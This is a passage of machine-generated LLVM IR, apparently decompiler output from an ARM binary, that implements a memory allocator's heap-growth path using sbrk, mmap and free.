  %v2_145ec = inttoptr i32 %v1_145ec to i32*
  %v3_145ec = load i32, i32* %v2_145ec, align 4
  store i32 %v3_145ec, i32* %r2.global-to-local, align 4
  %v1_145f0 = add i32 %v4_145e4, 840
  %v2_145f0 = inttoptr i32 %v1_145f0 to i32*
  %v3_145f0 = load i32, i32* %v2_145f0, align 4
  store i32 %v3_145f0, i32* %r3.global-to-local, align 4
  %v1_145f4 = add i32 %v3_145e8, 4
  %v2_145f4 = inttoptr i32 %v1_145f4 to i32*
  %v3_145f4 = load i32, i32* %v2_145f4, align 4
  store i32 %v3_145f4, i32* %r1.global-to-local, align 4
  %v1_145fc = urem i32 %v3_145ec, 2
  %v2_145fc = icmp eq i32 %v1_145fc, 0
  %v1_145f8 = add i32 %v1_14600, 16
  %v2_14600 = add i32 %v1_145f8, %v3_145f0
  store i32 %v2_14600, i32* %r3.global-to-local, align 4
  %v1_14604 = and i32 %v3_145f4, -4
  store i32 %v1_14604, i32* @r8, align 4
  br i1 %v2_145fc, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_145dc
  %v3_14608 = sub i32 %v2_14600, %v1_14604
  store i32 %v3_14608, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_145dc, %bb155
  %v0_1460c = phi i32 [ %v2_14600, %dec_label_pc_145dc ], [ %v3_14608, %bb155 ]
  %v1_1460c = load i32, i32* %sb.global-to-local, align 4
  %v2_1460c = add i32 %v1_1460c, %v0_1460c
  store i32 %v2_1460c, i32* %r3.global-to-local, align 4
  %v1_14610 = sub i32 -1, %v1_1460c
  store i32 %v1_14610, i32* %fp.global-to-local, align 4
  %v2_14614 = and i32 %v2_1460c, %v1_14610
  store i32 %v2_14614, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_14614, 1
  br i1 %tmp157, label %dec_label_pc_14638, label %dec_label_pc_14624

dec_label_pc_14624:                               ; preds = %bb156
  store i32 %v2_14614, i32* %r0.global-to-local, align 4
  %v1_14628 = call i32 @__GI_sbrk(i32 %v2_14614)
  store i32 %v1_14628, i32* %r0.global-to-local, align 4
  %v3_1462c = icmp eq i32 %v1_14628, -1
  store i32 %v1_14628, i32* @r4, align 4
  br i1 %v3_1462c, label %dec_label_pc_14638, label %dec_label_pc_146a4

dec_label_pc_14638:                               ; preds = %dec_label_pc_14624, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r1.global-to-local, align 4
  %v4_14640 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  store i32 %v4_14640, i32* %r6.global-to-local, align 4
  %v1_14644 = add i32 %v4_14640, 864
  %v2_14644 = inttoptr i32 %v1_14644 to i32*
  %v3_14644 = load i32, i32* %v2_14644, align 4
  store i32 %v3_14644, i32* %r3.global-to-local, align 4
  %v1_14648 = urem i32 %v3_14644, 2
  %v2_14648 = icmp eq i32 %v1_14648, 0
  br i1 %v2_14648, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_14638
  %v1_1464c = load i32, i32* @r8, align 4
  %v2_1464c = load i32, i32* %sb.global-to-local, align 4
  %v3_1464c = add i32 %v2_1464c, %v1_1464c
  %v2_14650 = load i32, i32* @r5, align 4
  %v3_14650 = add i32 %v3_1464c, %v2_14650
  store i32 %v3_14650, i32* %r3.global-to-local, align 4
  %v2_14654 = load i32, i32* %fp.global-to-local, align 4
  %v3_14654 = and i32 %v2_14654, %v3_14650
  store i32 %v3_14654, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_14638
  %v0_14658.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_14658 = phi i32 [ %v0_14658.pr, %.thread32thread-pre-split ], [ %v3_14654, %bb158 ]
  %v2_14658 = icmp ugt i32 %v0_14658, 1048575
  br i1 %v2_14658, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_14670 = phi i32 [ %v0_14658, %.thread32 ], [ 1048576, %bb159 ]
  %v1_14660 = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_14670, %v1_14660
  br i1 %tmp217, label %dec_label_pc_14668, label %dec_label_pc_148cc

dec_label_pc_14668:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_14670, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_14684 = call i32 @mmap(i32 0, i32 %v0_14670, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_14684, i32* %r0.global-to-local, align 4
  %v3_14688 = icmp eq i32 %v6_14684, -1
  %v8_14688 = icmp eq i32 %v6_14684, -1
  store i32 %v6_14684, i32* @r4, align 4
  br i1 %v8_14688, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_14668
  %v1_14690 = load i32, i32* %r6.global-to-local, align 4
  %v2_14690 = add i32 %v1_14690, 864
  %v3_14690 = inttoptr i32 %v2_14690 to i32*
  %v4_14690 = load i32, i32* %v3_14690, align 4
  %v2_14694 = load i32, i32* @r5, align 4
  %v3_14694 = add i32 %v2_14694, %v6_14684
  store i32 %v3_14694, i32* %r0.global-to-local, align 4
  %v2_14698 = and i32 %v4_14690, -2
  store i32 %v2_14698, i32* %r3.global-to-local, align 4
  store i32 %v2_14698, i32* %v3_14690, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_14668, %bb161
  br i1 %v3_14688, label %dec_label_pc_146a4, label %dec_label_pc_146a8

dec_label_pc_146a4:                               ; preds = %.thread35, %dec_label_pc_14624
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_146a8

dec_label_pc_146a8:                               ; preds = %.thread35, %dec_label_pc_146a4
  %v0_146a8 = load i32, i32* @r4, align 4
  %v7_146a8 = icmp eq i32 %v0_146a8, -1
  br i1 %v7_146a8, label %dec_label_pc_148cc, label %dec_label_pc_146b0

dec_label_pc_146b0:                               ; preds = %dec_label_pc_146a8
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r2.global-to-local, align 4
  %v4_146b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  store i32 %v4_146b8, i32* %ip.global-to-local, align 4
  store i32 %v3_145e8, i32* %r2.global-to-local, align 4
  %v1_146c0 = add i32 %v4_146b8, 872
  %v2_146c0 = inttoptr i32 %v1_146c0 to i32*
  %v3_146c0 = load i32, i32* %v2_146c0, align 4
  %v1_146c4 = load i32, i32* @r8, align 4
  %v2_146c4 = add i32 %v1_146c4, %v3_145e8
  store i32 %v2_146c4, i32* %r1.global-to-local, align 4
  %v0_146c8 = load i32, i32* @r5, align 4
  %v2_146c8 = add i32 %v0_146c8, %v3_146c0
  store i32 %v2_146c8, i32* %r3.global-to-local, align 4
  %v9_146cc = icmp eq i32 %v0_146a8, %v2_146c4
  br i1 %v9_146cc, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_146b0
  store i32 %v2_146c8, i32* %v2_146c0, align 4
  br label %dec_label_pc_146e8

bb162:                                            ; preds = %dec_label_pc_146b0
  %v1_146d0 = load i32, i32* %r0.global-to-local, align 4
  %v8_146d0 = icmp eq i32 %v1_146d0, -1
  store i32 %v2_146c8, i32* %v2_146c0, align 4
  br i1 %v8_146d0, label %.thread37, label %dec_label_pc_146e8

.thread37:                                        ; preds = %bb162
  %v1_146d8 = load i32, i32* @r5, align 4
  %v2_146d8 = load i32, i32* @r8, align 4
  %v3_146d8 = add i32 %v2_146d8, %v1_146d8
  %v2_146dc = or i32 %v3_146d8, 1
  store i32 %v2_146dc, i32* %r3.global-to-local, align 4
  %v2_146e0 = load i32, i32* %r2.global-to-local, align 4
  %v3_146e0 = add i32 %v2_146e0, 4
  %v4_146e0 = inttoptr i32 %v3_146e0 to i32*
  store i32 %v2_146dc, i32* %v4_146e0, align 4
  br label %dec_label_pc_14860

dec_label_pc_146e8:                               ; preds = %bb162, %.thread125
  %v0_146ec.pr = load i32, i32* @r8, align 4
  %v0_146e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_146e8 = add i32 %v0_146e8, 864
  %v2_146e8 = inttoptr i32 %v1_146e8 to i32*
  %v3_146e8 = load i32, i32* %v2_146e8, align 4
  store i32 %v3_146e8, i32* %r2.global-to-local, align 4
  %v2_146ec = icmp eq i32 %v0_146ec.pr, 0
  br i1 %v2_146ec, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_146e8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_146e8
  %v2_146f4 = urem i32 %v3_146e8, 2
  store i32 %v2_146f4, i32* %r3.global-to-local, align 4
  %v2_146f8 = icmp eq i32 %v2_146f4, 0
  br i1 %v2_146f8, label %.thread43, label %dec_label_pc_14700

dec_label_pc_14700:                               ; preds = %.thread39
  %v0_14700 = load i32, i32* @r4, align 4
  %v1_14700 = load i32, i32* %r1.global-to-local, align 4
  %v3_14700 = icmp ult i32 %v0_14700, %v1_14700
  br i1 %v3_14700, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_14700
  %v2_14704 = and i32 %v3_146e8, -2
  store i32 %v2_14704, i32* %r3.global-to-local, align 4
  store i32 %v2_14704, i32* %v2_146e8, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_14700, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %ip.global-to-local, align 4
  %v4_14714 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  store i32 %v4_14714, i32* @r7, align 4
  %v1_14718 = add i32 %v4_14714, 864
  %v2_14718 = inttoptr i32 %v1_14718 to i32*
  %v3_14718 = load i32, i32* %v2_14718, align 4
  store i32 %v3_14718, i32* %r3.global-to-local, align 4
  %v1_1471c = urem i32 %v3_14718, 2
  store i32 %v1_1471c, i32* @r6, align 4
  %v2_1471c = icmp eq i32 %v1_1471c, 0
  br i1 %v2_1471c, label %dec_label_pc_147b0, label %dec_label_pc_14724

dec_label_pc_14724:                               ; preds = %.thread43
  %v0_14724 = load i32, i32* @r8, align 4
  %v2_14724 = icmp eq i32 %v0_14724, 0
  br i1 %v2_14724, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_14724
  %v2_14728 = add i32 %v4_14714, 872
  %v3_14728 = inttoptr i32 %v2_14728 to i32*
  %v4_14728 = load i32, i32* %v3_14728, align 4
  store i32 %v4_14728, i32* %r2.global-to-local, align 4
  %v1_1472c = load i32, i32* %r1.global-to-local, align 4
  %v2_1472c = load i32, i32* @r4, align 4
  %v3_1472c = sub i32 %v2_1472c, %v1_1472c
  %v3_14730 = add i32 %v3_1472c, %v4_14728
  store i32 %v3_14730, i32* %r3.global-to-local, align 4
  store i32 %v3_14730, i32* %v3_14728, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_14724, %bb164
  %v0_14738 = load i32, i32* @r4, align 4
  %v1_14738 = urem i32 %v0_14738, 8
  store i32 %v1_14738, i32* %r3.global-to-local, align 4
  %v2_14738 = icmp eq i32 %v1_14738, 0
  br i1 %v2_14738, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_1473c = sub nsw i32 8, %v1_14738
  store i32 %v2_1473c, i32* %r3.global-to-local, align 4
  %v3_14740 = add i32 %v2_1473c, %v0_14738
  store i32 %v3_14740, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_14748 = phi i32 [ 0, %.thread46 ], [ %v2_1473c, %bb165 ]
  %v1_14744 = load i32, i32* @r5, align 4
  %v2_14744 = add i32 %v1_14744, %v0_14738
  store i32 %v2_14744, i32* @r6, align 4
  %v1_14748 = load i32, i32* @r8, align 4
  %v2_14748 = add i32 %v2_14744, %v0_14748
  %v2_1474c = add i32 %v2_14748, %v1_14748
  store i32 %v2_1474c, i32* %r1.global-to-local, align 4
  %v1_14750 = load i32, i32* %sb.global-to-local, align 4
  %v2_14750 = add i32 %v1_14750, %v2_1474c
  %v1_14754 = load i32, i32* %fp.global-to-local, align 4
  %v2_14754 = and i32 %v1_14754, %v2_14750
  store i32 %v2_14754, i32* %r2.global-to-local, align 4
  %v2_14758 = sub i32 0, %v2_14744
  store i32 %v2_14758, i32* %r3.global-to-local, align 4
  %v2_1475c = sub i32 %v2_14754, %v2_14744
  store i32 %v2_1475c, i32* @r5, align 4
  store i32 %v2_1475c, i32* %r0.global-to-local, align 4
  br i1 %v2_14738, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_14738, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_14768 = call i32 @__GI_sbrk(i32 %v2_1475c)
  store i32 %v1_14768, i32* %r0.global-to-local, align 4
  %v3_1476c = icmp eq i32 %v1_14768, -1
  br i1 %v3_1476c, label %dec_label_pc_14774, label %dec_label_pc_14784

dec_label_pc_14774:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_14778 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_14778, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_147dc

dec_label_pc_14784:                               ; preds = %bb167
  %v1_14784 = load i32, i32* @r4, align 4
  %v3_14784 = icmp ult i32 %v1_14768, %v1_14784
  br i1 %v3_14784, label %dec_label_pc_1478c, label %dec_label_pc_147dc

dec_label_pc_1478c:                               ; preds = %dec_label_pc_14784
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r0.global-to-local, align 4
  %v4_14794 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  store i32 %v4_14794, i32* %r2.global-to-local, align 4
  %v1_14798 = add i32 %v4_14794, 864
  %v2_14798 = inttoptr i32 %v1_14798 to i32*
  %v3_14798 = load i32, i32* %v2_14798, align 4
  %v0_1479c = load i32, i32* @r6, align 4
  store i32 %v0_1479c, i32* %r0.global-to-local, align 4
  %v1_147a0 = and i32 %v3_14798, -2
  store i32 %v1_147a0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_147a0, i32* %v2_14798, align 4
  br label %dec_label_pc_147dc

dec_label_pc_147b0:                               ; preds = %.thread43
  %v0_147b0 = load i32, i32* %r0.global-to-local, align 4
  %v3_147b0 = icmp eq i32 %v0_147b0, -1
  br i1 %v3_147b0, label %dec_label_pc_147b8, label %dec_label_pc_147d4

dec_label_pc_147b8:                               ; preds = %dec_label_pc_147b0
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_147bc = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_147bc, i32* %r0.global-to-local, align 4
  %v0_147c0 = load i32, i32* @r7, align 4
  %v1_147c0 = add i32 %v0_147c0, 872
  %v2_147c0 = inttoptr i32 %v1_147c0 to i32*
  %v3_147c0 = load i32, i32* %v2_147c0, align 4
  store i32 %v3_147c0, i32* %r2.global-to-local, align 4
  %v0_147c4 = load i32, i32* @r4, align 4
  %v0_147c8 = load i32, i32* @r5, align 4
  %v2_147c4 = add i32 %v3_147c0, %v1_147bc
  %v2_147c8 = sub i32 %v2_147c4, %v0_147c4
  %v2_147cc = sub i32 %v2_147c8, %v0_147c8
  store i32 %v2_147cc, i32* %r3.global-to-local, align 4
  store i32 %v2_147cc, i32* %v2_147c0, align 4
  %v0_147d8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_147d4

dec_label_pc_147d4:                               ; preds = %dec_label_pc_147b0, %dec_label_pc_147b8
  %v0_147d8 = phi i32 [ 0, %dec_label_pc_147b0 ], [ %v0_147d8.pre, %dec_label_pc_147b8 ]
  %v0_147d4 = load i32, i32* @r4, align 4
  store i32 %v0_147d4, i32* @r7, align 4
  store i32 %v0_147d8, i32* @r5, align 4
  br label %dec_label_pc_147dc

dec_label_pc_147dc:                               ; preds = %dec_label_pc_14784, %dec_label_pc_1478c, %dec_label_pc_14774, %dec_label_pc_147d4
  %v0_147dc = load i32, i32* %r0.global-to-local, align 4
  %v7_147dc = icmp eq i32 %v0_147dc, -1
  br i1 %v7_147dc, label %dec_label_pc_14860, label %dec_label_pc_147e4

dec_label_pc_147e4:                               ; preds = %dec_label_pc_147dc
  %v1_147e4 = load i32, i32* @r5, align 4
  %v2_147e4 = add i32 %v1_147e4, %v0_147dc
  %v0_147e8 = load i32, i32* @r7, align 4
  %v2_147e8 = sub i32 %v2_147e4, %v0_147e8
  %v1_147ec = or i32 %v2_147e8, 1
  %v2_147f0 = add i32 %v0_147e8, 4
  %v3_147f0 = inttoptr i32 %v2_147f0 to i32*
  store i32 %v1_147ec, i32* %v3_147f0, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_147fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  store i32 %v4_147fc, i32* @r6, align 4
  %v1_14800 = add i32 %v4_147fc, 872
  %v2_14800 = inttoptr i32 %v1_14800 to i32*
  %v3_14800 = load i32, i32* %v2_14800, align 4
  %v0_14804 = load i32, i32* @r8, align 4
  %v2_14804 = icmp eq i32 %v0_14804, 0
  %v0_14808 = load i32, i32* @r5, align 4
  %v2_14808 = add i32 %v0_14808, %v3_14800
  store i32 %v2_14808, i32* %r3.global-to-local, align 4
  store i32 %v2_14808, i32* %v2_14800, align 4
  %v0_14810 = load i32, i32* @r7, align 4
  %v1_14810 = load i32, i32* @r6, align 4
  %v2_14810 = add i32 %v1_14810, 44
  %v3_14810 = inttoptr i32 %v2_14810 to i32*
  store i32 %v0_14810, i32* %v3_14810, align 4
  br i1 %v2_14804, label %dec_label_pc_14860, label %dec_label_pc_14818

dec_label_pc_14818:                               ; preds = %dec_label_pc_147e4
  %v0_1481c = load i32, i32* @r8, align 4
  %v1_1481c = add i32 %v0_1481c, -12
  %v1_14820 = and i32 %v1_1481c, -8
  store i32 %v3_145e8, i32* %ip.global-to-local, align 4
  %v2_14828 = add i32 %v1_14820, %v3_145e8
  store i32 %v2_14828, i32* %r1.global-to-local, align 4
  %v2_1482c = icmp ugt i32 %v1_14820, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_14834 = or i32 %v1_14820, 1
  store i32 %v1_14834, i32* %r3.global-to-local, align 4
  store i32 %v1_14834, i32* %v2_145f4, align 4
  %v0_1483c = load i32, i32* %r2.global-to-local, align 4
  %v1_1483c = load i32, i32* %r1.global-to-local, align 4
  %v2_1483c = add i32 %v1_1483c, 8
  %v3_1483c = inttoptr i32 %v2_1483c to i32*
  store i32 %v0_1483c, i32* %v3_1483c, align 4
  %v0_14840 = load i32, i32* %r2.global-to-local, align 4
  %v1_14840 = load i32, i32* %r1.global-to-local, align 4
  %v2_14840 = add i32 %v1_14840, 4
  %v3_14840 = inttoptr i32 %v2_14840 to i32*
  store i32 %v0_14840, i32* %v3_14840, align 4
  br i1 %v2_1482c, label %dec_label_pc_14848, label %dec_label_pc_14860

dec_label_pc_14848:                               ; preds = %dec_label_pc_14818
  %v0_14848 = load i32, i32* @r6, align 4
  %v1_14848 = add i32 %v0_14848, 836
  %v2_14848 = inttoptr i32 %v1_14848 to i32*
  %v3_14848 = load i32, i32* %v2_14848, align 4
  store i32 %v3_14848, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_14850 = load i32, i32* %ip.global-to-local, align 4
  %v1_14850 = add i32 %v0_14850, 8
  store i32 %v1_14850, i32* @r0, align 4
  store i32 -1, i32* %v2_14848, align 4
  %v0_14858 = call i32 @free()
  store i32 %v0_14858, i32* %r0.global-to-local, align 4
  %v0_1485c = load i32, i32* @r4, align 4
  %v1_1485c = load i32, i32* @r6, align 4
  %v2_1485c = add i32 %v1_1485c, 836
  %v3_1485c = inttoptr i32 %v2_1485c to i32*
  store i32 %v0_1485c, i32* %v3_1485c, align 4
  br label %dec_label_pc_14860

dec_label_pc_14860:                               ; preds = %.thread37, %dec_label_pc_14818, %dec_label_pc_147e4, %dec_label_pc_147dc, %dec_label_pc_14848
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r0.global-to-local, align 4
  %v4_14868 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 64) to i32*), align 4
  store i32 %v4_14868, i32* %lr.global-to-local, align 4
  %v1_1486c = add i32 %v4_14868, 872
  store i32 %v1_1486c, i32* %r1.global-to-local, align 4
  %v1_14870 = inttoptr i32 %v1_1486c to i32*
  %v2_14870 = load i32, i32* %v1_14870, align 4
  store i32 %v2_14870, i32* %r1.global-to-local, align 4
  %v3_14870 = add i32 %v4_14868, 876
  %v4_14870 = inttoptr i32 %v3_14870 to i32*
  %v5_14870 = load i32, i32* %v4_14870, align 4
  store i32 %v5_14870, i32* %r3.global-to-local, align 4
  %v1_14878 = add i32 %v4_14868, 868
  %v2_14878 = inttoptr i32 %v1_14878 to i32*
  %v3_14878 = load i32, i32* %v2_14878, align 4
  store i32 %v3_14878, i32* %r3.global-to-local, align 4
  %v1_1487c = add i32 %v4_14868, 884
  %v2_1487c = inttoptr i32 %v1_1487c to i32*
  %v3_1487c = load i32, i32* %v2_1487c, align 4
  store i32 %v3_1487c, i32* %r2.global-to-local, align 4
  %v2_14880 = add i32 %v3_14878, %v2_14870
  store i32 %v2_14880, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_14870, %v5_14870
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_14860
  store i32 %v2_14870, i32* %v4_14870, align 4
  %v0_14888.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_14888.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_14860, %bb168
  %v1_14888 = phi i32 [ %v3_1487c, %dec_label_pc_14860 ], [ %v1_14888.pre, %bb168 ]
  %v4_1488c = phi i32 [ %v2_14880, %dec_label_pc_14860 ], [ %v0_14888.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_1488c, %v1_14888
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_1488c = load i32, i32* %lr.global-to-local, align 4
  %v6_1488c = add i32 %v5_1488c, 884
  %v7_1488c = inttoptr i32 %v6_1488c to i32*
  store i32 %v4_1488c, i32* %v7_1488c, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_14890 = load i32, i32* %lr.global-to-local, align 4
  %v1_14890 = add i32 %v0_14890, 44
  %v2_14890 = inttoptr i32 %v1_14890 to i32*
  %v3_14890 = load i32, i32* %v2_14890, align 4
  store i32 %v3_14890, i32* %ip.global-to-local, align 4
  %v1_14894 = add i32 %v3_14890, 4
  %v2_14894 = inttoptr i32 %v1_14894 to i32*
  %v3_14894 = load i32, i32* %v2_14894, align 4
  store i32 %v1_144a8, i32* %r1.global-to-local, align 4
  %v1_1489c = and i32 %v3_14894, -4
  store i32 %v1_1489c, i32* %r3.global-to-local, align 4
  %v3_148a0 = icmp ult i32 %v1_1489c, %v1_144a8
  br i1 %v3_148a0, label %dec_label_pc_148cc, label %dec_label_pc_148a8

dec_label_pc_148a8:                               ; preds = %bb171
  %v0_148a8 = load i32, i32* @sl, align 4
  %v2_148a8 = sub i32 %v1_1489c, %v0_148a8
  %v2_148ac = add i32 %v0_148a8, %v3_14890
  store i32 %v2_148ac, i32* %r1.global-to-local, align 4
  %v1_148b0 = or i32 %v2_148a8, 1
  store i32 %v1_148b0, i32* %r3.global-to-local, align 4
  %v1_148b4 = or i32 %v0_148a8, 1
  store i32 %v1_148b4, i32* %r2.global-to-local, align 4
  %v1_148b8 = add i32 %v3_14890, 8
  store i32 %v1_148b8, i32* %r0.global-to-local, align 4
  store i32 %v1_148b4, i32* %v2_14894, align 4
  %v0_148c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_148c0 = load i32, i32* %lr.global-to-local, align 4
  %v2_148c0 = add i32 %v1_148c0, 44
  %v3_148c0 = inttoptr i32 %v2_148c0 to i32*
  store i32 %v0_148c0, i32* %v3_148c0, align 4
  %v0_148c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_148c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_148c4 = add i32 %v1_148c4, 4
  %v3_148c4 = inttoptr i32 %v2_148c4 to i32*
  store i32 %v0_148c4, i32* %v3_148c4, align 4
  br label %dec_label_pc_148e4

dec_label_pc_148cc:                               ; preds = %bb160, %bb171, %dec_label_pc_146a8
  store i32 64500, i32* %r3.global-to-local, align 4
  %v0_148d0 = call i32 @__aeabi_read_tp()
  %v3_148d4 = load i16, i16* @global_var_244d0.762, align 2
  %v4_148d4 = sext i16 %v3_148d4 to i32
  store i32 %v4_148d4, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_148dc = add i32 %v4_148d4, %v0_148d0
  %v4_148dc = inttoptr i32 %v3_148dc to i32*
  store i32 12, i32* %v4_148dc, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_148e4

dec_label_pc_148e4:                               ; preds = %bb154, %bb153, %dec_label_pc_148a8, %dec_label_pc_144f0, %dec_label_pc_148cc
  %v0_148e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_148e4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_148e8

dec_label_pc_148e8:                               ; preds = %.thread4, %dec_label_pc_144bc, %.thread124, %dec_label_pc_1432c, %dec_label_pc_14320, %dec_label_pc_14188, %dec_label_pc_1410c, %dec_label_pc_148e4
  store i32 %v2_1402c, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r2.global-to-local, align 4
  %v4_148f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 44) to i32*), align 4
  store i32 %v4_148f8, i32* @ip, align 4
  store i32 84228, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_148f8)
  br label %dec_label_pc_14904

dec_label_pc_14904:                               ; preds = %dec_label_pc_14064, %dec_label_pc_148e8
  %v0_14904 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14904, i32* %r0.global-to-local, align 4
  store i32 %v3_14000, i32* @r4, align 4
  store i32 %v6_14000, i32* @r5, align 4
  store i32 %v9_14000, i32* @r6, align 4
  store i32 %v12_14000, i32* @r7, align 4
  store i32 %v15_14000, i32* @r8, align 4
  store i32 %v18_14000, i32* @sb, align 4
  store i32 %v21_14000, i32* @sl, align 4
  store i32 %v24_14000, i32* @fp, align 4
  store i32 %v27_14000, i32* @lr, align 4
  ret i32 %v0_14904

; uselistorder directives
  uselistorder i32 %v0_148a8, { 1, 0, 2 }
  uselistorder i32 %v3_14890, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1488c, { 1, 0 }
  uselistorder i32 %v2_14870, { 2, 0, 1, 3 }
  uselistorder i32 %v4_14868, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_14820, { 1, 2, 0 }
  uselistorder i32 %v0_147e8, { 1, 0 }
  uselistorder i32 %v0_147dc, { 1, 0 }
  uselistorder i32 %v2_147cc, { 1, 0 }
  uselistorder i32 %v2_1475c, { 2, 1, 0 }
  uselistorder i32 %v2_14744, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1473c, { 1, 0, 2 }
  uselistorder i32 %v1_14738, { 2, 1, 0 }
  uselistorder i32 %v0_14738, { 3, 1, 2, 0 }
  uselistorder i32 %v1_1471c, { 1, 0 }
  uselistorder i32 %v2_146f4, { 1, 0 }
  uselistorder i32 %v3_146e8, { 1, 0, 2 }
  uselistorder i32 %v2_146c8, { 1, 0, 2 }
  uselistorder i32* %v2_146c0, { 1, 0, 2 }
  uselistorder i32 %v0_146a8, { 1, 0 }
  uselistorder i32 %v6_14684, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_14670, { 2, 1, 0 }
  uselistorder i32 %v0_14658, { 1, 0 }
  uselistorder i32 %v2_14614, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14610, { 1, 0 }
  uselistorder i32 %v3_145e8, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_145c8, { 1, 0, 2 }
  uselistorder i32 %v2_145b0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_14558, { 2, 1, 0 }
  uselistorder i32 %v6_1454c, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_14528, { 2, 1, 0, 3 }
  uselistorder i32 %v3_144e8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_144a8, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_144a0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1449c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_14488, { 1, 0 }
